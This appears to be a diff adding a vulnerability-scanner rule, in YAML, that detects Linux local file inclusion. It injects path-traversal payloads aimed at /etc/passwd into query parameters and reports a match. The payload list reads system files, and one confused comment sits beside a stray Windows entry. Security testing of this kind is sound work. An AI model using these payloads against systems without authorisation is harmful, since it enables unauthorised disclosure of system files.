@@ -1,0 +1,47 @@
+rule_name: Linux Local File Inclusion
+description: Detects Linux LFI by attempting to access /etc/passwd using common traversal payloads.
+
+transform:
+  query:
+    replace_all_values_one_by_one:
+      - "/etc/passwd"
+      - "../../../../etc/passwd"
+      - "../../../../../../../../etc/passwd"
+      - "....//....//....//etc/passwd"
+      - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "file:///etc/passwd"
+      - "/bn/../../etc/passwd"
+      - "c:/windows/win.ini" # Sanity check or noise for fun? No, strict to Linux.
+      - "/etc/passwd%00"
+
+match_on:
+  body:
+    regex: "root:.*?:[0-9]*:[0-9]*:"
+
+report:
+  title: "Linux Local File Inclusion"
+  description: |
+    The application is vulnerable to Local File Inclusion (LFI) on Linux.
+    It was possible to read the /etc/passwd file.
+
+    Original Request:
+    {{original}}
+
+    Transformed Request:
+    {{req}}
+
+    Response:
+    {{res}}
+
+  cwe: "CWE-22"
+  cvssScore: "7.5"
+  mitigation: |
+    1. Validate and sanitize user input.
+    2. Use an allowlist of permitted filenames.
+    3. Disable file system access for the web user where possible.
+  stepsToReproduce: |
+    1. Inject LFI payload in query parameter.
+    2. Respond contains "root:x:0:0:".
+  tags: "lfi,linux,traversal,vuln"
+  impact: "Information Disclosure, RCE (via log poisoning)"
